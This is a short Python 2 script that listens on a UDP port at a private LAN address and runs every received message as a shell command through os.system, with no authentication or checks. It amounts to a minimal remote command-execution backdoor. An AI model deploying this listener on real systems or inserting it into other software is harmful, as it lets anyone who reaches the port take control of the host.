import socket
import os
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,0)
ip="192.168.43.80"
port=1234

s.bind( (ip,port) )
x=s.recvfrom(20)
cip=x[1][0]
cdata=x[0]
print cip,  cdata, x
print os.system(cdata)

